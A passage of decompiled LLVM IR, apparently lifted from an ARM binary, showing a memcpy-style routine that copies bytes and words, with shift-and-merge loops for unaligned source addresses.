  store i32 %v12_14f44, i32* @r0, align 4
  %v6_14f48 = load i32, i32* %r2.global-to-local, align 4
  %v7_14f48 = add i32 %v6_14f48, -4
  store i32 %v7_14f48, i32* %r2.global-to-local, align 4
  br label %bb131

bb131:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_14f2c, %bb, %dec_label_pc_150f4, %dec_label_pc_1501c, %dec_label_pc_15088, %bb130
  %v2_14f5c = phi i32 [ %v10_14f3c, %.thread5 ], [ %v0_14fec75, %.thread11 ], [ %v7_14f3c, %dec_label_pc_14f2c ], [ %v1_14eb0, %bb ], [ %v2_14f5c113, %dec_label_pc_150f4 ], [ %v2_14f5c112, %dec_label_pc_1501c ], [ %v2_14f5c111, %dec_label_pc_15088 ], [ %v12_14f44, %bb130 ]
  %v0_14f4c = phi i32 [ %v0_14f4c.pre, %.thread5 ], [ %v2_14f94, %.thread11 ], [ %v2_14f2c, %dec_label_pc_14f2c ], [ %v2_14ec0, %bb ], [ %v0_14f4c109, %dec_label_pc_150f4 ], [ %v0_14f4c108, %dec_label_pc_1501c ], [ %v0_14f4c107, %dec_label_pc_15088 ], [ %v7_14f48, %bb130 ]
  %v1_14f4c = add i32 %v0_14f4c, 4
  store i32 %v1_14f4c, i32* @r2, align 4
  %v3_14f4c = sub i32 0, %v0_14f4c
  %v4_14f4c = and i32 %v1_14f4c, %v3_14f4c
  %v5_14f4c = icmp slt i32 %v4_14f4c, 0
  store i1 %v5_14f4c, i1* %cpsr_v.global-to-local, align 1
  %v6_14f4c = icmp slt i32 %v1_14f4c, 0
  store i1 %v6_14f4c, i1* %cpsr_n.global-to-local, align 1
  %v7_14f4c = icmp eq i32 %v1_14f4c, 0
  store i1 %v7_14f4c, i1* @cpsr_z, align 1
  br i1 %v7_14f4c, label %bb132, label %bb133

bb132:                                            ; preds = %bb131
  %v3_14f50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14f50, i32* %r0.global-to-local, align 4
  ret i32 %v3_14f50

bb133:                                            ; preds = %bb131
  %v1_14f54 = add i32 %v0_14f4c, 2
  %v3_14f54 = sub i32 -3, %v0_14f4c
  %v4_14f54 = and i32 %v3_14f54, %v1_14f4c
  %v5_14f54 = icmp slt i32 %v4_14f54, 0
  store i1 %v5_14f54, i1* %cpsr_v.global-to-local, align 1
  %v6_14f54 = icmp slt i32 %v1_14f54, 0
  store i1 %v6_14f54, i1* %cpsr_n.global-to-local, align 1
  %v7_14f54 = icmp eq i32 %v1_14f4c, 2
  store i1 %v7_14f54, i1* @cpsr_z, align 1
  %v0_14f58 = load i32, i32* @r1, align 4
  %v1_14f58 = inttoptr i32 %v0_14f58 to i8*
  %v2_14f58 = load i8, i8* %v1_14f58, align 1
  %v3_14f58 = zext i8 %v2_14f58 to i32
  store i32 %v3_14f58, i32* %r3.global-to-local, align 4
  %v5_14f58 = add i32 %v0_14f58, 1
  store i32 %v5_14f58, i32* @r1, align 4
  %v3_14f5c = inttoptr i32 %v2_14f5c to i8*
  store i8 %v2_14f58, i8* %v3_14f5c, align 1
  %v4_14f5c = load i32, i32* @r0, align 4
  %v5_14f5c = add i32 %v4_14f5c, 1
  store i32 %v5_14f5c, i32* %r0.global-to-local, align 4
  %v0_14f60 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14f60 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14f60 = xor i1 %v0_14f60, %v1_14f60
  br i1 %v2_14f60, label %.thread119, label %bb134

bb134:                                            ; preds = %bb133
  %v3_14f60 = load i32, i32* @r1, align 4
  %v4_14f60 = inttoptr i32 %v3_14f60 to i8*
  %v5_14f60 = load i8, i8* %v4_14f60, align 1
  %v6_14f60 = zext i8 %v5_14f60 to i32
  store i32 %v6_14f60, i32* %r3.global-to-local, align 4
  %v8_14f60 = add i32 %v3_14f60, 1
  store i32 %v8_14f60, i32* @r1, align 4
  %v6_14f64 = inttoptr i32 %v5_14f5c to i8*
  store i8 %v5_14f60, i8* %v6_14f64, align 1
  %v7_14f64 = load i32, i32* %r0.global-to-local, align 4
  %v8_14f64 = add i32 %v7_14f64, 1
  store i32 %v8_14f64, i32* %r0.global-to-local, align 4
  %v1_14f68.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14f68.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb133, %bb134
  %v7_14f6c = phi i32 [ %v8_14f64, %bb134 ], [ %v5_14f5c, %bb133 ]
  %v2_14f6c = phi i1 [ %v2_14f68.pre, %bb134 ], [ %v1_14f60, %bb133 ]
  %v1_14f6c = phi i1 [ %v1_14f68.pre, %bb134 ], [ %v0_14f60, %bb133 ]
  %v0_14f68 = load i1, i1* @cpsr_z, align 1
  %v3_14f68 = xor i1 %v2_14f6c, %v1_14f6c
  %v4_14f68 = or i1 %v0_14f68, %v3_14f68
  br i1 %v4_14f68, label %.thread120, label %bb135

bb135:                                            ; preds = %.thread119
  %v5_14f68 = load i32, i32* @r1, align 4
  %v6_14f68 = inttoptr i32 %v5_14f68 to i8*
  %v7_14f68 = load i8, i8* %v6_14f68, align 1
  %v8_14f68 = zext i8 %v7_14f68 to i32
  store i32 %v8_14f68, i32* %r3.global-to-local, align 4
  %v10_14f68 = add i32 %v5_14f68, 1
  store i32 %v10_14f68, i32* @r1, align 4
  %v8_14f6c = inttoptr i32 %v7_14f6c to i8*
  store i8 %v7_14f68, i8* %v8_14f6c, align 1
  %v9_14f6c = load i32, i32* %r0.global-to-local, align 4
  %v10_14f6c = add i32 %v9_14f6c, 1
  store i32 %v10_14f6c, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb135
  %v2_14f70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14f70, i32* %r0.global-to-local, align 4
  ret i32 %v2_14f70

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14ec8
  %v1_14f74 = sub nsw i32 4, %v1_14ec8
  store i32 %v1_14f74, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14f78 = icmp ult i32 %v1_14f74, 2
  store i1 %v8_14f78, i1* %cpsr_n.global-to-local, align 1
  %v1_14f7c = inttoptr i32 %v0_14eb0 to i8*
  %v2_14f7c = load i8, i8* %v1_14f7c, align 1
  %v3_14f7c = zext i8 %v2_14f7c to i32
  store i32 %v3_14f7c, i32* %r3.global-to-local, align 4
  %v5_14f7c = add i32 %v0_14eb0, 1
  store i32 %v5_14f7c, i32* @r1, align 4
  %v3_14f80 = inttoptr i32 %v1_14eb0 to i8*
  store i8 %v2_14f7c, i8* %v3_14f80, align 1
  %v4_14f80 = load i32, i32* @r0, align 4
  %v5_14f80 = add i32 %v4_14f80, 1
  store i32 %v5_14f80, i32* @r0, align 4
  br i1 %v8_14f78, label %.thread11, label %bb136

bb136:                                            ; preds = %dec_label_pc_14f74
  %v9_14f78 = icmp eq i32 %v1_14f74, 2
  %v6_14f84 = load i32, i32* @r1, align 4
  %v7_14f84 = inttoptr i32 %v6_14f84 to i8*
  %v8_14f84 = load i8, i8* %v7_14f84, align 1
  %v9_14f84 = zext i8 %v8_14f84 to i32
  store i32 %v9_14f84, i32* %r3.global-to-local, align 4
  %v11_14f84 = add i32 %v6_14f84, 1
  store i32 %v11_14f84, i32* @r1, align 4
  %v9_14f88 = inttoptr i32 %v5_14f80 to i8*
  store i8 %v8_14f84, i8* %v9_14f88, align 1
  %v10_14f88 = load i32, i32* @r0, align 4
  %v11_14f88 = add i32 %v10_14f88, 1
  store i32 %v11_14f88, i32* @r0, align 4
  br i1 %v9_14f78, label %.thread11, label %bb137

bb137:                                            ; preds = %bb136
  %v8_14f8c = load i32, i32* @r1, align 4
  %v9_14f8c = inttoptr i32 %v8_14f8c to i8*
  %v10_14f8c = load i8, i8* %v9_14f8c, align 1
  %v11_14f8c = zext i8 %v10_14f8c to i32
  store i32 %v11_14f8c, i32* %r3.global-to-local, align 4
  %v13_14f8c = add i32 %v8_14f8c, 1
  store i32 %v13_14f8c, i32* @r1, align 4
  %v11_14f90 = inttoptr i32 %v11_14f88 to i8*
  store i8 %v10_14f8c, i8* %v11_14f90, align 1
  %v12_14f90 = load i32, i32* @r0, align 4
  %v13_14f90 = add i32 %v12_14f90, 1
  store i32 %v13_14f90, i32* @r0, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb136, %dec_label_pc_14f74, %bb137
  %v0_14fec75 = phi i32 [ %v11_14f88, %bb136 ], [ %v5_14f80, %dec_label_pc_14f74 ], [ %v13_14f90, %bb137 ]
  %v0_14f94 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f94 = load i32, i32* @ip, align 4
  %v2_14f94 = sub i32 %v0_14f94, %v1_14f94
  store i32 %v2_14f94, i32* %r2.global-to-local, align 4
  %v4_14f94 = xor i32 %v1_14f94, %v0_14f94
  %v5_14f94 = xor i32 %v2_14f94, %v0_14f94
  %v6_14f94 = and i32 %v5_14f94, %v4_14f94
  %v7_14f94 = icmp slt i32 %v6_14f94, 0
  store i1 %v7_14f94, i1* %cpsr_v.global-to-local, align 1
  %v8_14f94 = icmp slt i32 %v2_14f94, 0
  store i1 %v8_14f94, i1* %cpsr_n.global-to-local, align 1
  %v5_14f98 = icmp slt i32 %v0_14f94, %v1_14f94
  br i1 %v5_14f98, label %bb131, label %dec_label_pc_14f9c

dec_label_pc_14f9c:                               ; preds = %.thread11
  %v0_14f9c = load i32, i32* @r1, align 4
  %v1_14f9c = urem i32 %v0_14f9c, 4
  store i32 %v1_14f9c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14f9c = icmp eq i32 %v1_14f9c, 0
  %extract.t123 = trunc i32 %v0_14f9c to i2
  br i1 %v2_14f9c, label %dec_label_pc_14ed8, label %dec_label_pc_14fa4

dec_label_pc_14fa4:                               ; preds = %dec_label_pc_14ed0, %dec_label_pc_14f9c
  %v0_14fec74 = phi i32 [ %v1_14eb0, %dec_label_pc_14ed0 ], [ %v0_14fec75, %dec_label_pc_14f9c ]
  %v0_15098 = phi i32 [ %v2_14ec0, %dec_label_pc_14ed0 ], [ %v2_14f94, %dec_label_pc_14f9c ]
  %v0_14fac.off0 = phi i2 [ %extract.t, %dec_label_pc_14ed0 ], [ %extract.t123, %dec_label_pc_14f9c ]
  %v0_14fa4 = phi i32 [ %v0_14eb0, %dec_label_pc_14ed0 ], [ %v0_14f9c, %dec_label_pc_14f9c ]
  %v1_14fa4 = and i32 %v0_14fa4, -4
  store i32 %v1_14fa4, i32* %r1.global-to-local, align 4
  %v1_14fa8 = inttoptr i32 %v1_14fa4 to i32*
  %v2_14fa8 = load i32, i32* %v1_14fa8, align 4
  store i32 %v2_14fa8, i32* @lr, align 4
  %v4_14fa8 = add i32 %v1_14fa4, 4
  store i32 %v4_14fa8, i32* %r1.global-to-local, align 4
  %v2_15090 = add i32 %v0_15098, -12
  %v4_15090 = sub i32 11, %v0_15098
  %v5_15090 = and i32 %v4_15090, %v0_15098
  %v6_15090 = icmp slt i32 %v5_15090, 0
  store i1 %v6_15090, i1* %cpsr_v.global-to-local, align 1
  %v7_15090 = icmp slt i32 %v2_15090, 0
  store i1 %v7_15090, i1* %cpsr_n.global-to-local, align 1
  %v5_15094 = icmp slt i32 %v0_15098, 12
  switch i2 %v0_14fac.off0, label %dec_label_pc_14fb8 [
    i2 -1, label %dec_label_pc_15090
    i2 -2, label %dec_label_pc_15024
  ]

dec_label_pc_14fb8:                               ; preds = %dec_label_pc_14fa4
  br i1 %v5_15094, label %dec_label_pc_15004, label %dec_label_pc_14fc0

dec_label_pc_14fc0:                               ; preds = %dec_label_pc_14fb8
  store i32 %v2_15090, i32* %r2.global-to-local, align 4
  %v3_14fc4 = load i32, i32* @r4, align 4
  store i32 %v3_14fc4, i32* %stack_var_-16, align 4
  %v6_14fc4 = load i32, i32* @r5, align 4
  store i32 %v6_14fc4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14fc8

dec_label_pc_14fc8:                               ; preds = %dec_label_pc_14fc8.dec_label_pc_14fc8_crit_edge, %dec_label_pc_14fc0
  %v0_14fec = phi i32 [ %v12_14fec, %dec_label_pc_14fc8.dec_label_pc_14fc8_crit_edge ], [ %v0_14fec74, %dec_label_pc_14fc0 ]
  %v0_14fcc = phi i32 [ %v0_14fcc.pre, %dec_label_pc_14fc8.dec_label_pc_14fc8_crit_edge ], [ %v4_14fa8, %dec_label_pc_14fc0 ]
  %v0_14fc8 = phi i32 [ %v0_14fc8.pre, %dec_label_pc_14fc8.dec_label_pc_14fc8_crit_edge ], [ %v2_14fa8, %dec_label_pc_14fc0 ]
  %v3_14fc8 = udiv i32 %v0_14fc8, 256
  store i32 %v3_14fc8, i32* %r3.global-to-local, align 4
  %v1_14fcc = inttoptr i32 %v0_14fcc to i32*
  %v2_14fcc = load i32, i32* %v1_14fcc, align 4
  store i32 %v2_14fcc, i32* %r4.global-to-local, align 4
  %v3_14fcc = add i32 %v0_14fcc, 4
  %v4_14fcc = inttoptr i32 %v3_14fcc to i32*
  %v5_14fcc = load i32, i32* %v4_14fcc, align 4
  store i32 %v5_14fcc, i32* %r5.global-to-local, align 4
  %v6_14fcc = add i32 %v0_14fcc, 8
  %v7_14fcc = inttoptr i32 %v6_14fcc to i32*
  %v8_14fcc = load i32, i32* %v7_14fcc, align 4
  store i32 %v8_14fcc, i32* %ip.global-to-local, align 4
  %v9_14fcc = add i32 %v0_14fcc, 12
  %v10_14fcc = inttoptr i32 %v9_14fcc to i32*
  %v11_14fcc = load i32, i32* %v10_14fcc, align 4
  store i32 %v11_14fcc, i32* @lr, align 4
  %v12_14fcc = add i32 %v0_14fcc, 16
  store i32 %v12_14fcc, i32* %r1.global-to-local, align 4
  %v4_14fd0 = mul i32 %v2_14fcc, 16777216
  %v5_14fd0 = or i32 %v4_14fd0, %v3_14fc8
  store i32 %v5_14fd0, i32* %r3.global-to-local, align 4
  %v3_14fd4 = udiv i32 %v2_14fcc, 256
  %v4_14fd8 = mul i32 %v5_14fcc, 16777216
  %v5_14fd8 = or i32 %v4_14fd8, %v3_14fd4
  store i32 %v5_14fd8, i32* %r4.global-to-local, align 4
  %v3_14fdc = udiv i32 %v5_14fcc, 256
  %v4_14fe0 = mul i32 %v8_14fcc, 16777216
  %v5_14fe0 = or i32 %v4_14fe0, %v3_14fdc
  store i32 %v5_14fe0, i32* %r5.global-to-local, align 4
  %v3_14fe4 = udiv i32 %v8_14fcc, 256
  %v4_14fe8 = mul i32 %v11_14fcc, 16777216
  %v5_14fe8 = or i32 %v4_14fe8, %v3_14fe4
  store i32 %v5_14fe8, i32* @ip, align 4
  %v1_14fec = inttoptr i32 %v0_14fec to i32*
  store i32 %v5_14fd0, i32* %v1_14fec, align 4
  %v3_14fec = add i32 %v0_14fec, 4
  %v4_14fec = inttoptr i32 %v3_14fec to i32*
  %v5_14fec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14fec, i32* %v4_14fec, align 4
  %v6_14fec = add i32 %v0_14fec, 8
  %v7_14fec = inttoptr i32 %v6_14fec to i32*
  %v8_14fec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14fec, i32* %v7_14fec, align 4
  %v9_14fec = add i32 %v0_14fec, 12
  %v10_14fec = inttoptr i32 %v9_14fec to i32*
  %v11_14fec = load i32, i32* @ip, align 4
  store i32 %v11_14fec, i32* %v10_14fec, align 4
  %v12_14fec = add i32 %v0_14fec, 16
  store i32 %v12_14fec, i32* @r0, align 4
  %v0_14ff0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ff0 = add i32 %v0_14ff0, -16
  store i32 %v2_14ff0, i32* %r2.global-to-local, align 4
  %v6_14ff4 = icmp slt i32 %v0_14ff0, 16
  br i1 %v6_14ff4, label %dec_label_pc_14ff8, label %dec_label_pc_14fc8.dec_label_pc_14fc8_crit_edge

dec_label_pc_14fc8.dec_label_pc_14fc8_crit_edge:  ; preds = %dec_label_pc_14fc8
  %v0_14fc8.pre = load i32, i32* @lr, align 4
  %v0_14fcc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14fc8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fc8
  %v2_14ff8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14ff8, i32* @r4, align 4
  %v5_14ff8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14ff8, i32* @r5, align 4
  %v2_14ffc = add i32 %v0_14ff0, -4
  store i32 %v2_14ffc, i32* %r2.global-to-local, align 4
  %v4_14ffc = add i32 %v0_14ff0, 2147483632
  %v5_14ffc = and i32 %v2_14ffc, %v4_14ffc
  %v6_14ffc = icmp slt i32 %v5_14ffc, 0
  store i1 %v6_14ffc, i1* %cpsr_v.global-to-local, align 1
  %v7_14ffc = icmp slt i32 %v2_14ffc, 0
  store i1 %v7_14ffc, i1* %cpsr_n.global-to-local, align 1
  %v5_15000 = icmp slt i32 %v2_14ff0, -12
  br i1 %v5_15000, label %dec_label_pc_1501c, label %dec_label_pc_15004

dec_label_pc_15004:                               ; preds = %dec_label_pc_14ff8, %dec_label_pc_14fb8, %dec_label_pc_15004
  %v1_15010 = phi i32 [ %v4_15010, %dec_label_pc_15004 ], [ %v12_14fec, %dec_label_pc_14ff8 ], [ %v0_14fec74, %dec_label_pc_14fb8 ]
  %v0_15004 = load i32, i32* @lr, align 4
  %v3_15004 = udiv i32 %v0_15004, 256
  store i32 %v3_15004, i32* %ip.global-to-local, align 4
  %v0_15008 = load i32, i32* %r1.global-to-local, align 4
  %v1_15008 = inttoptr i32 %v0_15008 to i32*
  %v2_15008 = load i32, i32* %v1_15008, align 4
  store i32 %v2_15008, i32* @lr, align 4
  %v4_15008 = add i32 %v0_15008, 4
  store i32 %v4_15008, i32* %r1.global-to-local, align 4
  %v4_1500c = mul i32 %v2_15008, 16777216
  %v5_1500c = or i32 %v4_1500c, %v3_15004
  store i32 %v5_1500c, i32* @ip, align 4
  %v2_15010 = inttoptr i32 %v1_15010 to i32*
  store i32 %v5_1500c, i32* %v2_15010, align 4
  %v3_15010 = load i32, i32* @r0, align 4
  %v4_15010 = add i32 %v3_15010, 4
  store i32 %v4_15010, i32* @r0, align 4
  %v0_15014 = load i32, i32* %r2.global-to-local, align 4
  %v2_15014 = add i32 %v0_15014, -4
  store i32 %v2_15014, i32* %r2.global-to-local, align 4
  %v6_15018 = icmp slt i32 %v0_15014, 4
  br i1 %v6_15018, label %dec_label_pc_1501c.loopexit, label %dec_label_pc_15004

dec_label_pc_1501c.loopexit:                      ; preds = %dec_label_pc_15004
  %v4_15014 = sub i32 3, %v0_15014
  %v5_15014 = and i32 %v4_15014, %v0_15014
  %v6_15014 = icmp slt i32 %v5_15014, 0
  %v7_15014 = icmp slt i32 %v2_15014, 0
  store i1 %v6_15014, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15014, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %dec_label_pc_1501c.loopexit, %dec_label_pc_14ff8
  %v2_14f5c112 = phi i32 [ %v4_15010, %dec_label_pc_1501c.loopexit ], [ %v12_14fec, %dec_label_pc_14ff8 ]
  %v0_14f4c108 = phi i32 [ %v2_15014, %dec_label_pc_1501c.loopexit ], [ %v2_14ffc, %dec_label_pc_14ff8 ]
  %v0_1501c = load i32, i32* %r1.global-to-local, align 4
  %v1_1501c = add i32 %v0_1501c, -3
  store i32 %v1_1501c, i32* @r1, align 4
  br label %bb131

dec_label_pc_15024:                               ; preds = %dec_label_pc_14fa4
  br i1 %v5_15094, label %dec_label_pc_15070, label %dec_label_pc_1502c

dec_label_pc_1502c:                               ; preds = %dec_label_pc_15024
  store i32 %v2_15090, i32* %r2.global-to-local, align 4
  %v3_15030 = load i32, i32* @r4, align 4
  store i32 %v3_15030, i32* %stack_var_-16, align 4
  %v6_15030 = load i32, i32* @r5, align 4
  store i32 %v6_15030, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15034

dec_label_pc_15034:                               ; preds = %dec_label_pc_15034.dec_label_pc_15034_crit_edge, %dec_label_pc_1502c
  %v0_15058 = phi i32 [ %v12_15058, %dec_label_pc_15034.dec_label_pc_15034_crit_edge ], [ %v0_14fec74, %dec_label_pc_1502c ]
  %v0_15038 = phi i32 [ %v0_15038.pre, %dec_label_pc_15034.dec_label_pc_15034_crit_edge ], [ %v4_14fa8, %dec_label_pc_1502c ]
  %v0_15034 = phi i32 [ %v0_15034.pre, %dec_label_pc_15034.dec_label_pc_15034_crit_edge ], [ %v2_14fa8, %dec_label_pc_1502c ]
  %v3_15034 = udiv i32 %v0_15034, 65536
  store i32 %v3_15034, i32* %r3.global-to-local, align 4
  %v1_15038 = inttoptr i32 %v0_15038 to i32*
  %v2_15038 = load i32, i32* %v1_15038, align 4
  store i32 %v2_15038, i32* %r4.global-to-local, align 4
  %v3_15038 = add i32 %v0_15038, 4
  %v4_15038 = inttoptr i32 %v3_15038 to i32*
  %v5_15038 = load i32, i32* %v4_15038, align 4
  store i32 %v5_15038, i32* %r5.global-to-local, align 4
  %v6_15038 = add i32 %v0_15038, 8
  %v7_15038 = inttoptr i32 %v6_15038 to i32*
  %v8_15038 = load i32, i32* %v7_15038, align 4
  store i32 %v8_15038, i32* %ip.global-to-local, align 4
  %v9_15038 = add i32 %v0_15038, 12
  %v10_15038 = inttoptr i32 %v9_15038 to i32*
  %v11_15038 = load i32, i32* %v10_15038, align 4
  store i32 %v11_15038, i32* @lr, align 4
  %v12_15038 = add i32 %v0_15038, 16
  store i32 %v12_15038, i32* %r1.global-to-local, align 4
  %v4_1503c = mul i32 %v2_15038, 65536
  %v5_1503c = or i32 %v4_1503c, %v3_15034
  store i32 %v5_1503c, i32* %r3.global-to-local, align 4
  %v3_15040 = udiv i32 %v2_15038, 65536
  %v4_15044 = mul i32 %v5_15038, 65536
  %v5_15044 = or i32 %v4_15044, %v3_15040
  store i32 %v5_15044, i32* %r4.global-to-local, align 4
  %v3_15048 = udiv i32 %v5_15038, 65536
  %v4_1504c = mul i32 %v8_15038, 65536
  %v5_1504c = or i32 %v4_1504c, %v3_15048
  store i32 %v5_1504c, i32* %r5.global-to-local, align 4
  %v3_15050 = udiv i32 %v8_15038, 65536
  %v4_15054 = mul i32 %v11_15038, 65536
  %v5_15054 = or i32 %v4_15054, %v3_15050
  store i32 %v5_15054, i32* @ip, align 4
  %v1_15058 = inttoptr i32 %v0_15058 to i32*
  store i32 %v5_1503c, i32* %v1_15058, align 4
  %v3_15058 = add i32 %v0_15058, 4
  %v4_15058 = inttoptr i32 %v3_15058 to i32*
  %v5_15058 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15058, i32* %v4_15058, align 4
  %v6_15058 = add i32 %v0_15058, 8
  %v7_15058 = inttoptr i32 %v6_15058 to i32*
  %v8_15058 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15058, i32* %v7_15058, align 4
  %v9_15058 = add i32 %v0_15058, 12
  %v10_15058 = inttoptr i32 %v9_15058 to i32*
  %v11_15058 = load i32, i32* @ip, align 4
  store i32 %v11_15058, i32* %v10_15058, align 4
  %v12_15058 = add i32 %v0_15058, 16
  store i32 %v12_15058, i32* @r0, align 4
  %v0_1505c = load i32, i32* %r2.global-to-local, align 4
  %v2_1505c = add i32 %v0_1505c, -16
  store i32 %v2_1505c, i32* %r2.global-to-local, align 4
  %v6_15060 = icmp slt i32 %v0_1505c, 16
  br i1 %v6_15060, label %dec_label_pc_15064, label %dec_label_pc_15034.dec_label_pc_15034_crit_edge

dec_label_pc_15034.dec_label_pc_15034_crit_edge:  ; preds = %dec_label_pc_15034
  %v0_15034.pre = load i32, i32* @lr, align 4
  %v0_15038.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15034

dec_label_pc_15064:                               ; preds = %dec_label_pc_15034
  %v2_15064 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15064, i32* @r4, align 4
  %v5_15064 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15064, i32* @r5, align 4
  %v2_15068 = add i32 %v0_1505c, -4
  store i32 %v2_15068, i32* %r2.global-to-local, align 4
  %v4_15068 = add i32 %v0_1505c, 2147483632
  %v5_15068 = and i32 %v2_15068, %v4_15068
  %v6_15068 = icmp slt i32 %v5_15068, 0
  store i1 %v6_15068, i1* %cpsr_v.global-to-local, align 1
  %v7_15068 = icmp slt i32 %v2_15068, 0
  store i1 %v7_15068, i1* %cpsr_n.global-to-local, align 1
  %v5_1506c = icmp slt i32 %v2_1505c, -12
  br i1 %v5_1506c, label %dec_label_pc_15088, label %dec_label_pc_15070

dec_label_pc_15070:                               ; preds = %dec_label_pc_15064, %dec_label_pc_15024, %dec_label_pc_15070
  %v1_1507c = phi i32 [ %v4_1507c, %dec_label_pc_15070 ], [ %v12_15058, %dec_label_pc_15064 ], [ %v0_14fec74, %dec_label_pc_15024 ]
  %v0_15070 = load i32, i32* @lr, align 4
  %v3_15070 = udiv i32 %v0_15070, 65536
  store i32 %v3_15070, i32* %ip.global-to-local, align 4
  %v0_15074 = load i32, i32* %r1.global-to-local, align 4
  %v1_15074 = inttoptr i32 %v0_15074 to i32*
  %v2_15074 = load i32, i32* %v1_15074, align 4
  store i32 %v2_15074, i32* @lr, align 4
  %v4_15074 = add i32 %v0_15074, 4
  store i32 %v4_15074, i32* %r1.global-to-local, align 4
  %v4_15078 = mul i32 %v2_15074, 65536
  %v5_15078 = or i32 %v4_15078, %v3_15070
  store i32 %v5_15078, i32* @ip, align 4
  %v2_1507c = inttoptr i32 %v1_1507c to i32*
  store i32 %v5_15078, i32* %v2_1507c, align 4
  %v3_1507c = load i32, i32* @r0, align 4
  %v4_1507c = add i32 %v3_1507c, 4
  store i32 %v4_1507c, i32* @r0, align 4
  %v0_15080 = load i32, i32* %r2.global-to-local, align 4
  %v2_15080 = add i32 %v0_15080, -4
  store i32 %v2_15080, i32* %r2.global-to-local, align 4
  %v6_15084 = icmp slt i32 %v0_15080, 4
  br i1 %v6_15084, label %dec_label_pc_15088.loopexit, label %dec_label_pc_15070

dec_label_pc_15088.loopexit:                      ; preds = %dec_label_pc_15070
  %v4_15080 = sub i32 3, %v0_15080
  %v5_15080 = and i32 %v4_15080, %v0_15080
  %v6_15080 = icmp slt i32 %v5_15080, 0
  %v7_15080 = icmp slt i32 %v2_15080, 0
  store i1 %v6_15080, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15080, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %dec_label_pc_15088.loopexit, %dec_label_pc_15064
  %v2_14f5c111 = phi i32 [ %v4_1507c, %dec_label_pc_15088.loopexit ], [ %v12_15058, %dec_label_pc_15064 ]
  %v0_14f4c107 = phi i32 [ %v2_15080, %dec_label_pc_15088.loopexit ], [ %v2_15068, %dec_label_pc_15064 ]
  %v0_15088 = load i32, i32* %r1.global-to-local, align 4
  %v1_15088 = add i32 %v0_15088, -2
  store i32 %v1_15088, i32* @r1, align 4
  br label %bb131

dec_label_pc_15090:                               ; preds = %dec_label_pc_14fa4
  br i1 %v5_15094, label %dec_label_pc_150dc, label %dec_label_pc_15098

dec_label_pc_15098:                               ; preds = %dec_label_pc_15090
  store i32 %v2_15090, i32* %r2.global-to-local, align 4
  %v3_1509c = load i32, i32* @r4, align 4
  store i32 %v3_1509c, i32* %stack_var_-16, align 4
  %v6_1509c = load i32, i32* @r5, align 4
  store i32 %v6_1509c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_150a0

dec_label_pc_150a0:                               ; preds = %dec_label_pc_150a0.dec_label_pc_150a0_crit_edge, %dec_label_pc_15098
  %v0_150c4 = phi i32 [ %v12_150c4, %dec_label_pc_150a0.dec_label_pc_150a0_crit_edge ], [ %v0_14fec74, %dec_label_pc_15098 ]
  %v0_150a4 = phi i32 [ %v0_150a4.pre, %dec_label_pc_150a0.dec_label_pc_150a0_crit_edge ], [ %v4_14fa8, %dec_label_pc_15098 ]
  %v0_150a0 = phi i32 [ %v0_150a0.pre, %dec_label_pc_150a0.dec_label_pc_150a0_crit_edge ], [ %v2_14fa8, %dec_label_pc_15098 ]
  %v3_150a0 = udiv i32 %v0_150a0, 16777216
  store i32 %v3_150a0, i32* %r3.global-to-local, align 4
  %v1_150a4 = inttoptr i32 %v0_150a4 to i32*
  %v2_150a4 = load i32, i32* %v1_150a4, align 4
  store i32 %v2_150a4, i32* %r4.global-to-local, align 4
  %v3_150a4 = add i32 %v0_150a4, 4
  %v4_150a4 = inttoptr i32 %v3_150a4 to i32*
  %v5_150a4 = load i32, i32* %v4_150a4, align 4
  store i32 %v5_150a4, i32* %r5.global-to-local, align 4
  %v6_150a4 = add i32 %v0_150a4, 8
  %v7_150a4 = inttoptr i32 %v6_150a4 to i32*
  %v8_150a4 = load i32, i32* %v7_150a4, align 4
  store i32 %v8_150a4, i32* %ip.global-to-local, align 4
  %v9_150a4 = add i32 %v0_150a4, 12
  %v10_150a4 = inttoptr i32 %v9_150a4 to i32*
  %v11_150a4 = load i32, i32* %v10_150a4, align 4
  store i32 %v11_150a4, i32* @lr, align 4
  %v12_150a4 = add i32 %v0_150a4, 16
  store i32 %v12_150a4, i32* %r1.global-to-local, align 4
  %v4_150a8 = mul i32 %v2_150a4, 256
  %v5_150a8 = or i32 %v4_150a8, %v3_150a0
  store i32 %v5_150a8, i32* %r3.global-to-local, align 4
  %v3_150ac = udiv i32 %v2_150a4, 16777216
  %v4_150b0 = mul i32 %v5_150a4, 256
  %v5_150b0 = or i32 %v4_150b0, %v3_150ac
  store i32 %v5_150b0, i32* %r4.global-to-local, align 4
